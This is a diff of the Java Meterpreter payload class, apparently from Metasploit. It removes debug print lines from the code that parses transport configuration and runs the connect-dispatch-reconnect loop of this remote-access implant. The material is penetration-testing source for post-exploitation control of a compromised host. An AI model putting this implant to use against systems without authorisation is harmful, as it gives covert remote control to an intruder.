@@ -48,19 +48,16 @@ public class Meterpreter {
 
 
     private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
-        System.out.println("msf : Parsing configuration");
         // socket handle is 4 bytes, followed by exit func, both of
         // which we ignore.
         int csr = 8;
 
         // We start with the expiry, which is a 32 bit int
         setExpiry(unpack32(configuration, csr));
-        System.out.println("msf : Unpacked expiry: " + this.sessionExpiry);
         csr += 4;
 
         // this is followed with the UUID
         this.uuid = readBytes(configuration, csr, UUID_LEN);
-        System.out.println("msf : Read the UUID: " + this.uuid.length);
         csr += UUID_LEN;
 
         // here we need to loop through all the given transports, we know that we're
@@ -68,7 +65,6 @@ public class Meterpreter {
         while (configuration[csr] != '\0') {
             // read the transport URL
             String url = readString(configuration, csr, URL_LEN);
-            System.out.println("msf : Read URL: " + url);
             csr += URL_LEN;
 
             Transport t = null;
@@ -80,7 +76,6 @@ public class Meterpreter {
 
             csr = t.parseConfig(configuration, csr);
             if (this.transports.isEmpty()) {
-                System.out.println("msf : Binding the first transport");
                 t.bind(in, rawOut);
             }
             this.transports.add(t);
@@ -88,7 +83,6 @@ public class Meterpreter {
         
         // we don't currently support extensions, so when we reach the end of the
         // list of transports we just bomb out.
-        System.out.println("msf : Finished parsing configuration");
     }
 
     public long getExpiry() {
@@ -100,7 +94,6 @@ public class Meterpreter {
     }
 
     public void setExpiry(long seconds) {
-        System.out.println("msf : Setting expiry forward seconds " + seconds);
         this.sessionExpiry = System.currentTimeMillis() + seconds * Transport.MS;
     }
 
@@ -154,13 +147,10 @@ public class Meterpreter {
      * @throws Exception
      */
     public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception {
-        System.out.println("msf : Meterpreter constructing");
 
         int configLen = in.readInt();
         byte[] configBytes = new byte[configLen];
         in.readFully(configBytes);
-
-        System.out.println("msf : Meterpreter config length: " + configLen);
 
         loadConfiguration(in, rawOut, configBytes);
 
@@ -170,7 +160,6 @@ public class Meterpreter {
         // blocks down the track when we reconnect. We have to store this in
         // the meterpreter class instead of the TCP comms class though
         this.ignoreBlocks = in.readInt();
-        System.out.println("msf : ignoring blocks on reconnect : " + this.ignoreBlocks);
 
         this.loadExtensions = loadExtensions;
         this.commandManager = new CommandManager();
@@ -188,7 +177,6 @@ public class Meterpreter {
     }
 
     public TransportList getTransports() {
-        System.out.println("msf : transports are " + (this.transports == null ? "null" : "not null"));
         return this.transports;
     }
 
@@ -197,17 +185,12 @@ public class Meterpreter {
     }
 
     public void startExecuting() throws Exception {
-        System.out.println("msf : kicking off execution");
         while (!this.hasSessionExpired() && this.transports.current() != null) {
-            System.out.println("msf : initialising transport");
             if (!this.transports.current().connect(this)) {
-                System.out.println("msf : connection failed, going to next transport");
                 continue;
             }
 
-            System.out.println("msf : entering dispatch");
             boolean cleanExit = this.transports.current().dispatch(this);
-            System.out.println("msf : dispatch exited " + (cleanExit ? "cleanly" : "badly or from timeout"));
             this.transports.current().disconnect();
 
             if (cleanExit && !this.transports.changeRequested()) {
@@ -216,7 +199,6 @@ public class Meterpreter {
 
             this.transports.moveNext(this);
         }
-        System.out.println("msf : and we're done, cleaing channels");
         synchronized (this) {
             for (Iterator it = channels.iterator(); it.hasNext(); ) {
                 Channel c = (Channel) it.next();
@@ -224,7 +206,6 @@ public class Meterpreter {
                     c.close();
             }
         }
-        System.out.println("msf : done executing");
     }
 
     protected String getPayloadTrustManager() {
